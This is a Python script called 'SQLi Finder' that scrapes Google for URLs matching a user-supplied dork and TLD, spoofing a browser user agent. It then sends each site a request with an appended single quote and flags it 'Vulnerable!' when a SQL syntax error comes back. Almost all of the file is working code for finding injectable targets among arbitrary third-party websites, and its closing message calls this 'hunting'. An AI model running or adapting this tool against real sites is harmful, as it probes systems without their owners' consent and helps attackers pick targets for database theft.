#!/usr/bin/env python3
import random
import os
import sys
import urllib.request
from socket import timeout
from termcolor import colored
from googlesearch import search
import terminal_banner

os.system('clear')

banner_text = """
              ╔═╗╔═╗ ╦  ╦   ╔═╗╦╔╗╔╔╦╗╔═╗╦═╗
              ╚═╗║═╬╗║  ║───╠╣ ║║║║ ║║║╣ ╠╦╝
              ╚═╝╚═╝╚╩═╝╩   ╚  ╩╝╚╝═╩╝╚═╝╩╚═                          
                        Made with ❤️ 
            For the Community, By the Community   

            ###################################

                  Developed by Jitesh Kumar
            Instagram  - https://instagram.com/jitesh.haxx
            LinkedIn  - https://linkedin.com/j1t3sh 
                GitHub - https://github.com/j1t3sh
                                    
       (DON'T COPY THE CODE. CONTRIBUTIONS ARE MOST WELCOME ❤️)
"""
banner_terminal = terminal_banner.Banner(banner_text)
print(colored(banner_terminal, 'green') + "\n")

website_list = []

dork = "inurl:" + input(colored("Please input the SQLi Dork (e.g., php?id=, aspx?id=) ----> ", 'cyan'))
extension = "site:" + input(colored("Please specify the website extension (e.g., .in, .com, .pk) [default: none] -----> ", 'cyan'))
total_output = int(input(colored("Please specify the total number of websites you want ----> ", 'cyan')))
page_no = int(input(colored("From which Google page do you want to start (e.g., 1, 2, 3) ----> ", 'cyan')))

if extension == "site:":
    extension = ""

try:
    query = dork + " " + extension
    pause_random = random.randint(4, 10)
    for result in search(query, num=10, start=page_no * 5, stop=total_output, pause=pause_random, 
                        user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36'):
        website_list.append(result)

    for website in website_list:
        try:
            full_url = website
            try:
                resp = urllib.request.urlopen(full_url + "'", timeout=15)
            except timeout:
                print(website + " ===> " + colored("Timeout!", 'yellow'))
                continue
            body = resp.read()
            full_body = body.decode('utf-8')
            if "SQL syntax" in full_body:
                print(website + " ===> " + colored("Vulnerable!", 'green'))
            else:
                print(website + " ===> " + colored("Not Vulnerable!", 'red'))
        except Exception as e:
            print(website + " ===> " + colored("Cannot be determined", 'blue'))
            continue

except Exception as e:
    print("Your IP has been blocked by Google. Wait for 1 hour.")
    print("Go chill outside, then come back and start hunting again :)")
